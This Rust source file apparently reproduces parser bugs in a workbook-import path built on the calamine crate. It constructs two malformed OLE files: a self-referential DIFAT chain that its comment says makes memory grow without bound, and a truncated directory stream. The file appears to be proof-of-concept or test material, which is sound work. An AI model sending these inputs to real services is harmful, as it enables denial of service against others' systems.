//! Opens a workbook the way Spice 2.1 `XlsxParser::parse` does.
//!
//! `document_parse` calls `open_workbook_from_rs::<Xlsx, _>` on the object
//! bytes. That constructor runs the OLE reader on the raw file before the
//! ZIP reader.

use calamine::{Xlsx, open_workbook_from_rs};
use std::io::Cursor;

const ENDOFCHAIN: u32 = 0xFFFF_FFFE;
const DIFSECT: u32 = 0xFFFF_FFFC;

pub fn open_xlsx(bytes: &[u8]) -> Result<Xlsx<Cursor<Vec<u8>>>, calamine::XlsxError> {
    open_workbook_from_rs(Cursor::new(bytes.to_vec()))
}

fn header() -> Vec<u8> {
    let mut bytes = vec![0u8; 512];
    bytes[0..8].copy_from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
    bytes[26..28].copy_from_slice(&3u16.to_le_bytes());
    bytes[30..32].copy_from_slice(&0x0009u16.to_le_bytes());
    bytes[32..34].copy_from_slice(&0x0006u16.to_le_bytes());
    for word in bytes[76..512].chunks_exact_mut(4) {
        word.copy_from_slice(&DIFSECT.to_le_bytes());
    }
    bytes
}

/// 512-byte OLE file. The DIFAT chain's next sector is sector 0, this header.
/// After the first short read the cached sector is 512 zero bytes, so the
/// chain stays on sector 0 and the DIFAT vector grows without a bound.
pub fn self_referential_difat() -> Vec<u8> {
    let mut bytes = header();
    bytes[68..72].copy_from_slice(&0u32.to_le_bytes());
    bytes[508..512].copy_from_slice(&0u32.to_le_bytes());
    bytes
}

/// Directory chain ends on a 60-byte tail, shorter than one 128-byte entry.
pub fn short_directory_stream() -> Vec<u8> {
    let mut bytes = header();
    bytes[40..44].copy_from_slice(&1u32.to_le_bytes());
    bytes[48..52].copy_from_slice(&1u32.to_le_bytes());
    bytes[68..72].copy_from_slice(&ENDOFCHAIN.to_le_bytes());
    bytes[76..80].copy_from_slice(&0u32.to_le_bytes());
    let mut fat = vec![0u8; 512];
    fat[4..8].copy_from_slice(&ENDOFCHAIN.to_le_bytes());
    bytes.extend_from_slice(&fat);
    bytes.extend_from_slice(&[0xA5u8; 60]);
    bytes
}
